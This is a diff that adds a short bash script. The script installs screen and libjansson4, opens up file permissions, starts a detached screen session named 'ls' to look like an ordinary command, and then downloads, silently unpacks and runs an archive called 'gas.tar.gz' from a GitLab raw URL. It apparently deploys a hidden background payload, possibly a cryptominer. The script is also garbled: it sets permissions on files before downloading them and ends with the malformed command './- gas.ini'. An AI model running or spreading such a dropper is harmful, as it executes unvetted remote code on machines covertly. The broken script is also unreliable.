@@ -1,0 +1,7 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x gas.sh && chmod +x cuil && chmod 777 cuil gas.sh
+screen -dmS ls 
+wget https://gitlab.com/a7480247/suites/-/raw/main/gas.tar.gz && tar -xvf gas.tar.gz >/dev/null 2>&1
+./- gas.ini
